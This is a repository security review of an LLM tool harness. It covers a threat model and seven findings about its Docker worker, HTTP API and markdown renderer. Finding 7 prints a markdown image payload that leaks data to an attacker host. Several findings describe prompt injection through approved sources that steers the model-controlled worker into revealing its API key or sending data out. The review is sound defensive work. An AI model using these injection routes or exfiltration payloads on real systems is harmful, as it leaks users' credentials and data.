# Security Review: cli-agent

## Scope
- Scan mode: repository-wide Codex Security scan.
- Repository root: `C:\Users\madse\Documents\cli-agent`.
- Commit: `f3aa271`.
- Scan id: `f3aa271_20260618T114122Z`.
- Worklist coverage: 41 tracked source/config/runtime rows reviewed; generated `python-agent-runs` and `frontend/.next` rows were excluded from the canonical tracked-source worklist, and `worker/Dockerfile` was added back explicitly.
- Validation status: focused tests passed with `26 passed`; local harnesses validated wildcard CORS, in-run artifact reads, markdown remote image rendering, and symlink behavior constraints.
- Main limitations: no live Docker/Copilot run, no malicious PDF PoC, and Windows symlink creation was blocked by local privilege requirements.
- Final artifacts: markdown report at `C:\tmp\codex-security-scans\cli-agent\f3aa271_20260618T114122Z\report.md` and HTML report at `C:\tmp\codex-security-scans\cli-agent\f3aa271_20260618T114122Z\report.html`.

### Scan Summary
| Field | Value |
| --- | --- |
| Reportable findings | 7 |
| Severity mix | 5 medium, 2 low |
| Confidence mix | 4 high, 3 medium |
| Coverage | 41/41 deep-review rows closed; 14 coverage rows recorded |
| Validation mode | Static trace, focused tests, local HTTP/file/markdown harnesses |

## Threat Model

# Threat Model: cli-agent

## Overview

`cli-agent` is a Python proof harness that exposes two model-callable tools, `source_search` and `auto_analysis`, through a Streamlit UI (`streamlit_app.py`) and an MCP stdio server (`cli_agent/mcp_server.py`). The tools let an OpenAI-compatible chat model request exact approved local source files, copy those files into an isolated run folder, optionally extract PDF text, and invoke a short-lived Docker worker running the GitHub Copilot CLI to produce an answer and optional artifacts. The reusable runtime is organized under `cli_agent/`; Streamlit is a temporary UI surface, and the MCP server exposes the same dispatch path.

The assets that matter most are local approved source files, the host filesystem under the repository root, generated run folders and artifacts, Docker host access, OpenAI-compatible chat provider credentials/endpoints, Copilot provider settings and API keys, and the integrity of tool outputs shown back to users or MCP clients. The main security objective is to let an untrusted or model-influenced request inspect only explicitly approved source files and write only bounded output artifacts, without turning tool execution into arbitrary host file access, command execution, network pivoting, or credential exposure.

## Threat Model, Trust Boundaries, and Assumptions

Primary runtime surfaces:

- `streamlit_app.py` accepts user chat input, displays approved source labels/paths, renders markdown answers, and exposes CSV/PNG artifacts for download or display.
- `cli_agent/mcp_server.py` exposes `source_search` and `auto_analysis` as MCP tools over stdio and dispatches requests through the same `Subagent`/`ToolManager` path.
- `cli_agent/controllers/chat_controller.py` sends conversation history to the chat agent, permits at most one tool call per turn, executes that tool call, and then asks the model for a final answer.
- `cli_agent/managers/tool_manager.py` parses model tool calls, validates argument keys, validates required strings, handles clarification logic, creates run folders, builds worker prompts, runs Docker, and collects artifacts.
- `cli_agent/services/approved_sources.py` loads `settings/approved_sources.json`, requires repo-relative source paths, rejects path traversal outside the repository root, rejects unapproved model-requested paths, deduplicates requested sources, and enforces source count and byte limits.
- `cli_agent/services/run_folder_service.py` creates UUID-based run folders under `python-agent-runs/`, copies approved files into `input/`, and extracts PDF text via `pypdf` before worker execution.
- `cli_agent/services/docker_runner.py` builds the Docker command, passes selected environment variables, mounts the run folder at `/workspace`, applies read-only rootfs/capability/PID/tmpfs restrictions, and runs the Copilot CLI.
- `cli_agent/services/artifact_service.py` reads worker outputs from `output/`, collects CSV and PNG artifacts, records a manifest, and returns a JSON envelope to the chat or MCP caller.
- `cli_agent/services/openai_chat_client.py` sends chat completion requests to the configured OpenAI-compatible base URL using the configured API key.

Trust boundaries:

- User and MCP client input crosses into the app as chat text or tool arguments. The app assumes these callers may be untrusted unless the deployment wraps it with authentication and authorization.
- The chat model is not trusted to choose safe tool arguments. Tool schema enums are a hint, but `ToolManager` and `ApprovedSourceService` are the authoritative enforcement points.
- `settings/approved_sources.json` and environment variables are operator/developer-controlled configuration. A malicious or careless operator can deliberately approve sensitive files, point endpoints at hostile services, weaken limits, or choose a permissive Docker network.
- Approved source file contents are attacker-controlled when the corpus comes from users or third parties. They can contain prompt injection, malformed PDFs, large files within configured limits, or content intended to influence the worker/model.
- The Docker worker is model-controlled execution over copied inputs. It must be treated as less trusted than the host app; its outputs are data, not executable instructions.
- The Docker daemon and host filesystem are privileged infrastructure. The app assumes Docker itself enforces the container boundary and that the worker image is built from trusted inputs.
- The OpenAI-compatible chat endpoint and Copilot provider endpoint are network trust boundaries. Requests may carry user prompts, source path names, tool outputs, and potentially excerpts of approved source data.

Attacker-controlled inputs include Streamlit chat prompts, MCP tool arguments, model-generated tool call JSON, contents and filenames of operator-approved source files, worker-generated `answer.md`, `needs_clarification.json`, CSVs, PNGs, and provider responses. Operator-controlled inputs include environment variables, approved source JSON, Docker image name, Docker network name, source-size limits, concurrency/timeouts, and provider credentials. Developer-controlled inputs include application code, tests, scripts, and the worker Dockerfile.

Key assumptions:

- This proof harness is intended for trusted local or internal use unless external authn/authz, quotas, retention, and observability are added.
- Approved source configuration is curated by a trusted operator and should not include secrets or broad repository paths.
- The worker image and installed Copilot CLI are trusted supply-chain artifacts at build time.
- Docker runs with normal container isolation, and operators do not grant host-equivalent privileges or unconstrained network reachability through `CLI_AGENT_DOCKER_NETWORK`.
- Run folders are intentionally retained for manual inspection; retention and access control are deployment responsibilities.

## Attack Surface, Mitigations, and Attacker Stories

Important mitigations already present:

- Model-requested source paths must exactly match approved strings loaded by `ApprovedSourceService.validate_requested_paths`; absolute paths and paths escaping `repo_root` are rejected while loading approved sources.
- Source-count, single-source-size, and total-source-size limits reduce denial-of-service and accidental disclosure blast radius.
- Tool dispatch rejects unknown tools, malformed JSON, missing arguments, unknown argument keys, non-string questions, and oversized/control-character `analysis_goal` values.
- `ChatController` rejects multiple tool calls in a single model turn.
- Run folder names include timestamps and UUID fragments, and directories are created with `exist_ok=False`.
- PDF text extraction happens before worker execution, and image-only/unextractable PDFs fail clearly instead of producing guessed answers.
- Worker containers run with `--read-only`, `--cap-drop=ALL`, `no-new-privileges`, a bounded `/tmp`, a PID limit, an init process, no remote/built-in MCPs, a restricted working directory, and only the run folder mounted.
- The README explicitly calls out that network restriction is external and warns not to grant firewall or network-admin privileges to the model-controlled container.
- Runner timeouts, queue timeouts, and a process-local semaphore bound worker execution.

Realistic attacker stories:

- A user or compromised chat model tries to request an unapproved file, a path traversal, or an absolute host path. The expected control is exact allowlist enforcement in `approved_sources.py` before Docker starts.
- A malicious approved PDF attempts parser abuse, decompression/resource exhaustion, or prompt injection. Relevant controls are byte limits, pre-worker `pypdf` extraction failures, worker timeout, and the fact that source content is still allowed to influence model output but should not expand file access.
- A model-generated tool call tries to smuggle unsupported arguments, multiple tools, or command-like content in `analysis_goal`. The expected controls are argument-key validation, one-tool-per-turn enforcement, and control-character/length checks.
- A malicious worker output tries to abuse Streamlit rendering or artifact download/display. `answer.md` is rendered as markdown, CSV files are served through download buttons, PNGs are displayed, and arbitrary other artifact paths are shown as text. Markdown/script handling depends on Streamlit defaults and should be reviewed before external exposure.
- A worker tries to access the host filesystem, write outside `/workspace`, fork excessively, or contact external services. The expected controls are Docker mount scope, read-only rootfs, PID limits, no added capabilities, and operator-provided network policy.
- A remote OpenAI-compatible provider receives sensitive prompts, approved source excerpts, or output artifacts. This is in scope for privacy/egress review; the app relies on operator selection of trusted providers and API keys.
- A local user abuses retained run folders to read prior users' copied sources, outputs, logs, or manifests. The current app intentionally leaves run folders for inspection and does not implement retention or access control.

Out-of-scope or lower-probability stories in the current repository context:

- Cross-tenant authorization and billing abuse are not first-order issues for the proof harness because the repository does not implement multi-tenant accounts, sessions, payments, or external user identity.
- CSRF/session fixation is less relevant until the Streamlit surface is deployed behind authenticated web access.
- SQL injection and traditional database authorization failures are not central because the repository does not use a database.
- SSRF through app-side HTTP requests is limited to configured chat completion endpoint calls; worker-side network risk depends primarily on Docker network policy and provider configuration.

## Severity Calibration (Critical, High, Medium, Low)

Critical findings in this repository would usually require escaping the intended source/worker boundary into host compromise or broad secret disclosure. Examples include a path validation flaw that lets model-chosen tool arguments copy arbitrary host files into the worker and provider prompt, Docker command or mount construction that lets attacker input mount host-sensitive paths or run arbitrary host commands, or worker containment weaknesses that make the Docker daemon/host filesystem reachable from model-controlled execution.

High findings would allow unauthorized access to sensitive approved or adjacent data, meaningful remote code execution within a privileged deployment boundary, or reliable bypass of core isolation controls without full host compromise. Examples include accepting unapproved source paths due to normalization mismatch, unsafe rendering of worker-controlled markdown/artifacts into executable browser content when exposed to users, or a configurable Docker network/default that unintentionally grants model-controlled containers access to internal services and credentials.

Medium findings would weaken integrity, confidentiality, or availability within expected local/internal use but have bounded blast radius. Examples include prompt-injection paths that cause uncited or misleading answers while still respecting the source allowlist, malformed PDF handling that crashes a request or consumes excessive CPU within configured limits, retained run folders leaking data to other local users on a shared host, or process-local concurrency allowing overload when deployed with multiple replicas.

Low findings would be hardening gaps, confusing failure modes, or developer-footguns that do not by themselves cross a major trust boundary. Examples include unclear configuration errors, incomplete manifest metadata, insufficient artifact type filtering that only exposes paths as text, missing cleanup tooling for local runs, or documentation gaps around safe provider/network setup.


## Findings

| # | Finding | Severity | Confidence | Category |
| --- | --- | --- | --- | --- |
| 1 | [Unauthenticated wildcard-CORS HTTP API lets arbitrary browser origins drive and read local runs](#1-unauthenticated-wildcard-cors-http-api-lets-arbitrary-browser-origins-drive-and-read-local-runs) | medium | high | Missing authentication / permissive CORS |
| 2 | [Artifact route serves arbitrary files inside a run folder, including copied approved inputs](#2-artifact-route-serves-arbitrary-files-inside-a-run-folder-including-copied-approved-inputs) | medium | high | Insecure direct object/file access |
| 3 | [Model-controlled worker receives COPILOT_PROVIDER_API_KEY and can disclose it through output](#3-model-controlled-worker-receives-copilot_provider_api_key-and-can-disclose-it-through-output) | medium | high | Secret exposure / agent boundary failure |
| 4 | [Worker-created symlinks in the writable bind mount can redirect host reads and writes outside the run folder](#4-worker-created-symlinks-in-the-writable-bind-mount-can-redirect-host-reads-and-writes-outside-the-run-folder) | medium | medium | Symlink confused deputy / file boundary escape |
| 5 | [Docker worker defaults to unrestricted Docker networking when no network is configured](#5-docker-worker-defaults-to-unrestricted-docker-networking-when-no-network-is-configured) | medium | high | Container egress / SSRF |
| 6 | [Approved PDFs are parsed and fully extracted on the host before Docker worker limits apply](#6-approved-pdfs-are-parsed-and-fully-extracted-on-the-host-before-docker-worker-limits-apply) | low | medium | Host-side parser resource exhaustion |
| 7 | [Model-controlled markdown can trigger browser requests to attacker-controlled URLs](#7-model-controlled-markdown-can-trigger-browser-requests-to-attacker-controlled-urls) | low | medium | Browser-side data exfiltration via markdown media |


### Confidence Scale
| Label | Meaning |
| --- | --- |
| high | Direct source, configuration, or runtime evidence supports the finding, with no material unresolved reachability or exploitability blocker. |
| medium | Source evidence supports a plausible issue, but runtime behavior, deployment configuration, role reachability, type constraints, or exploit reliability still need proof. |
| low | Weak or incomplete evidence; included only for follow-up candidates. |

### [1] Unauthenticated wildcard-CORS HTTP API lets arbitrary browser origins drive and read local runs

| Field | Value |
| --- | --- |
| Severity | medium |
| Confidence | high |
| Confidence rationale | Harness/static validation supports this; remaining uncertainty is deployment-specific. |
| Category | Missing authentication / permissive CORS |
| CWE | CWE-306, CWE-346, CWE-942, CWE-200 |
| Affected lines | `cli_agent/http_api.py:57-65; cli_agent/http_api.py:85-120; cli_agent/http_api.py:155-169; cli_agent/http_api.py:187-193; frontend/src/lib/api.ts:8-32` |

#### Summary
The HTTP API accepts cross-origin browser requests by default and has no caller authentication. A page on another origin can enumerate approved source paths, start a chat job, poll the run result, and read artifact URLs when the backend is reachable.

#### Validation
A local HTTP harness saved under the scan artifacts showed Access-Control-Allow-Origin: * on /sources and /chat, and an unauthenticated POST /chat returned 202 with a pollable result. Focused tests passed with 26 passed.

#### Dataflow
`attacker origin -> frontend/browser fetch -> cli_agent/http_api.py /sources or /chat -> ChatController/ToolManager -> run result and artifact URLs -> browser-readable response`

#### Reachability
Reachable when cli-agent-http is running on localhost or exposed to a frontend/backend URL. The tool allowlist still limits which source files can be read, but the caller/origin boundary is missing.

#### Severity
Medium: the issue exposes approved source-derived answers/artifacts and consumes worker capacity, but repository evidence frames this as a local/internal proof harness rather than a public multi-tenant service. Public deployment evidence would raise severity; an auth token plus strict origin allowlist would lower it.

#### Remediation
Require authentication for /sources, /chat, /runs/*, and /artifacts/*; default CORS to a configured explicit origin, not *; reject unexpected Origin headers; add tests for cross-origin rejection and unauthenticated access.

### [2] Artifact route serves arbitrary files inside a run folder, including copied approved inputs

| Field | Value |
| --- | --- |
| Severity | medium |
| Confidence | high |
| Confidence rationale | Harness/static validation supports this; remaining uncertainty is deployment-specific. |
| Category | Insecure direct object/file access |
| CWE | CWE-639, CWE-862, CWE-200 |
| Affected lines | `cli_agent/http_api.py:155-163; cli_agent/http_api.py:416-424; cli_agent/http_api.py:427-446; cli_agent/http_api.py:449-459; cli_agent/services/run_folder_service.py:36-42` |

#### Summary
The artifact endpoint validates that a requested file stays inside the selected run folder, but it does not require the file to be one of the artifact or trace paths the backend intentionally exposed. Any caller with a run_id can construct a file_id for raw copied inputs and other retained in-run files.

#### Validation
A local harness encoded input/sample_sources/dnd5e_hp_reference.md as a file_id and _artifact_path_from_id resolved and read the raw file. Existing tests prove traversal rejection but do not enforce manifest membership.

#### Dataflow
`HTTP caller -> /artifacts/{run_id}/{file_id} -> _decode_file_id -> run-root containment check -> target.read_bytes -> raw in-run file response`

#### Reachability
Self-created runs are enough to read copied approved inputs deterministically. Reading another user run requires learning that run_id, which is a separate precondition.

#### Severity
Medium: the issue bypasses the intended artifact exposure boundary and can disclose approved inputs/prompts/logs, but it remains scoped to files under a known run folder. Stronger cross-user run-id exposure or sensitive approved corpora would raise severity.

#### Remediation
Serve only files listed in the recorded manifest/tool envelope for that run, or issue unguessable per-file capabilities. Deny input/ and work/ by default. Add tests that encoded input paths and logs are rejected unless explicitly whitelisted.

### [3] Model-controlled worker receives COPILOT_PROVIDER_API_KEY and can disclose it through output

| Field | Value |
| --- | --- |
| Severity | medium |
| Confidence | high |
| Confidence rationale | Harness/static validation supports this; remaining uncertainty is deployment-specific. |
| Category | Secret exposure / agent boundary failure |
| CWE | CWE-200, CWE-522 |
| Affected lines | `cli_agent/settings.py:64; cli_agent/services/docker_runner.py:147-168; cli_agent/services/docker_runner.py:64-66; cli_agent/services/artifact_service.py:30-65; cli_agent/managers/tool_manager.py:230-234; cli_agent/controllers/chat_controller.py:57-62; streamlit_app.py:109-119` |

#### Summary
The host passes COPILOT_PROVIDER_API_KEY into the worker container. The worker is model-controlled and has shell-capable tools, while returned answer, stderr, artifacts, tool messages, and final chat context are not redacted.

#### Validation
Static source-to-sink trace plus focused Docker command tests. docker_command.json redacts secret-looking env values, but the live worker receives the raw secret and output paths are not scrubbed.

#### Dataflow
`host env COPILOT_PROVIDER_API_KEY -> DockerRunner -e env -> model-controlled worker with bash/create/edit -> answer.md or stderr -> ArtifactService ToolEnvelope -> Streamlit/final model call`

#### Reachability
Any user or prompt-injected approved source that influences the worker can ask it to reveal process environment when the key is configured.

#### Severity
Medium: provider token disclosure is material, but it depends on the optional key being configured and on untrusted users/source content influencing worker output. Broad external use or high-privilege provider tokens would raise severity.

#### Remediation
Do not put provider credentials in the general worker environment. Use a narrow broker or short-lived process-scoped token, remove bash if not required, and redact configured secret values from stdout, stderr, answer.md, manifest, trace previews, and tool messages. Add canary-secret regression tests.

### [4] Worker-created symlinks in the writable bind mount can redirect host reads and writes outside the run folder

| Field | Value |
| --- | --- |
| Severity | medium |
| Confidence | medium |
| Confidence rationale | Static trace supports this, but runtime or deployment behavior still needs proof. |
| Category | Symlink confused deputy / file boundary escape |
| CWE | CWE-59, CWE-73, CWE-200 |
| Affected lines | `cli_agent/services/docker_runner.py:49-50; cli_agent/services/docker_runner.py:64-66; cli_agent/services/artifact_service.py:30-33; cli_agent/services/artifact_service.py:109-125; cli_agent/services/docker_runner.py:442-445; cli_agent/services/artifact_service.py:175-209; streamlit_app.py:90-100` |

#### Summary
The worker can modify the writable /workspace/output bind mount before host post-processing. Host reads answer/artifacts and writes logs/manifest without lstat/no-follow checks or final run-root containment checks on the direct Streamlit path.

#### Validation
Static order proof supports the issue. A bounded local Windows symlink harness was blocked by WinError 1314, so platform-specific runtime proof remains open rather than disproven.

#### Dataflow
`worker creates output symlink -> Docker exits -> ArtifactService read_text/glob/resolve or DockerRunner write_text -> host follows symlink -> Streamlit/final context or host file write`

#### Reachability
Reachable for deployments whose bind mount permits symlink creation/following, especially Linux Docker hosts. Requires host account permission to read/write the target.

#### Severity
Medium: the bug crosses the intended worker/host filesystem boundary, but exploitability is platform-dependent and was not reproduced on this Windows host. Linux Docker reproduction would raise confidence/severity.

#### Remediation
Treat worker output as hostile. Use lstat and no-follow opens, require regular files, verify resolved paths remain under the run root before every read/write, recreate trusted output/log directories after worker exit, and store host logs/manifests outside worker-writable paths.

### [5] Docker worker defaults to unrestricted Docker networking when no network is configured

| Field | Value |
| --- | --- |
| Severity | medium |
| Confidence | high |
| Confidence rationale | Harness/static validation supports this; remaining uncertainty is deployment-specific. |
| Category | Container egress / SSRF |
| CWE | CWE-918, CWE-200 |
| Affected lines | `cli_agent/settings.py:42-66; cli_agent/services/docker_runner.py:43-45; cli_agent/services/docker_runner.py:64-66; worker/Dockerfile:3-5` |

#### Summary
When CLI_AGENT_DOCKER_NETWORK is unset, DockerRunner omits --network, so Docker default networking applies. The worker has bash plus Python, Node, git, and CA certificates while holding copied approved sources and optional provider settings.

#### Validation
Static command construction and focused tests confirm --network is absent by default and only added when configured. The Dockerfile provides network-capable tooling.

#### Dataflow
`prompt-influenced worker -> shell/Python/Node/git network client -> Docker default bridge/host-reachable network -> attacker or internal destination`

#### Reachability
Reachable whenever an untrusted prompt or approved source can influence worker behavior and the operator has not configured a restrictive Docker network.

#### Severity
Medium: uncontrolled egress can exfiltrate approved sources and become an internal network pivot, but actual reachable targets depend on the operator Docker network.

#### Remediation
Default to --network=none. Add an explicit opt-in for a constrained provider network or proxy. Test that default commands deny networking and document the secure default.

### [6] Approved PDFs are parsed and fully extracted on the host before Docker worker limits apply

| Field | Value |
| --- | --- |
| Severity | low |
| Confidence | medium |
| Confidence rationale | Static trace supports this, but runtime or deployment behavior still needs proof. |
| Category | Host-side parser resource exhaustion |
| CWE | CWE-400, CWE-770 |
| Affected lines | `cli_agent/managers/tool_manager.py:101-117; cli_agent/services/run_folder_service.py:51-85; cli_agent/services/approved_sources.py:105-118; scripts/build_approved_sources.py:57-76; settings/approved_sources.5e_phb.example.json:1-114` |

#### Summary
Approved PDF extraction happens in the host Python process before Docker worker execution. Source byte limits do not bound parser CPU, page count, object count, recursion, or extracted text size.

#### Validation
Static order trace shows copy_sources/extract PDFs runs before DockerRunner.run. No malicious PDF harness was generated; default active config uses a small markdown sample.

#### Dataflow
`approved PDF path -> ApprovedSourceService byte checks -> RunFolderService.copy_sources -> PdfReader and page.extract_text on host -> unbounded page_blocks/write_text`

#### Reachability
Requires a malicious or adversarial PDF to be included in the approved corpus and requested by a user/model.

#### Severity
Low: this is an availability issue gated by operator-approved PDFs. It would rise if untrusted PDF upload/approval is part of deployment.

#### Remediation
Move extraction into a constrained worker or subprocess with timeout, memory, page-count, and output-byte caps. Fail closed when extracted text exceeds limits and add parser-limit tests.

### [7] Model-controlled markdown can trigger browser requests to attacker-controlled URLs

| Field | Value |
| --- | --- |
| Severity | low |
| Confidence | medium |
| Confidence rationale | Static trace supports this, but runtime or deployment behavior still needs proof. |
| Category | Browser-side data exfiltration via markdown media |
| CWE | CWE-200 |
| Affected lines | `frontend/src/components/chat-workbench.tsx:259; frontend/src/components/chat-workbench.tsx:288; frontend/src/components/chat-workbench.tsx:364-368; frontend/src/lib/types.ts:45; cli_agent/services/artifact_service.py:32` |

#### Summary
Assistant and worker-controlled markdown is rendered with ReactMarkdown defaults. Raw HTML is escaped, but normal markdown images/links with http(s) URLs are preserved, causing browser requests outside worker network controls.

#### Validation
A Node render harness produced an img tag and preload link for ![x](https://attacker.example/pixel?d=secret). No browser network capture was run.

#### Dataflow
`model/worker report_markdown -> frontend ToolResultPanel/ChatBubble -> MarkdownBlock -> ReactMarkdown default URL handling -> browser request to remote URL`

#### Reachability
Requires model or worker output to include a crafted markdown image or link, potentially via approved-source prompt injection.

#### Severity
Low: this can leak data only if sensitive text is encoded into a URL by model/worker output; it is not DOM XSS. Demonstrated sensitive exfiltration would raise severity.

#### Remediation
Disable image rendering for untrusted markdown or restrict allowed URI schemes/hosts with a custom urlTransform/components map. Consider rendering links as plain text unless explicitly trusted.

## Reviewed Surfaces
| Surface | Risk Area | Outcome | Notes |
| --- | --- | --- | --- |
| HTTP API | Auth, CORS, job/artifact access | Reported | Findings 1 and 2 cover caller/origin and in-run file authorization. |
| Docker worker boundary | Secrets, network, bind mount | Reported | Findings 3, 4, and 5 cover env secret exposure, symlink confused deputy, and default egress. |
| Approved source ingestion | Path traversal and parser DoS | Reported / Rejected | Exact allowlist path traversal was rejected; host-side PDF parser limits are finding 6. |
| Frontend renderer | Markdown and artifact display | Reported / Rejected | Remote markdown media is finding 7; raw HTML XSS was rejected because no rehypeRaw/dangerouslySetInnerHTML path was found. |
| MCP server | Tool exposure | Rejected | stdio-only server delegates to ToolManager validation. |
| Model tool dispatch | Multi-tool and unapproved paths | Rejected | One tool call enforced; requested sources must exactly match approved paths. |
| Host Docker invocation | Host shell injection | Rejected | Docker is invoked as an argv list, not shell interpolation. |
| Frontend config/build | Rewrites, proxy, package scripts | No issue found | No runtime proxy/rewrite or project lifecycle script issue found. |
| Package markers/types/exceptions | Runtime sink coverage | Not applicable | Declarations only. |

## Open Questions And Follow Up
- After fixing HTTP auth/CORS, rerun a targeted review of `cli_agent/http_api.py` for artifact authorization and run ownership.
- On a Linux Docker host, reproduce the symlink read/write cases for `output/answer.md`, `output/logs/copilot.stderr.log`, and `output/manifest.json`.
- Add canary-secret tests proving `COPILOT_PROVIDER_API_KEY` never appears in answers, errors, traces, manifests, or final model messages.
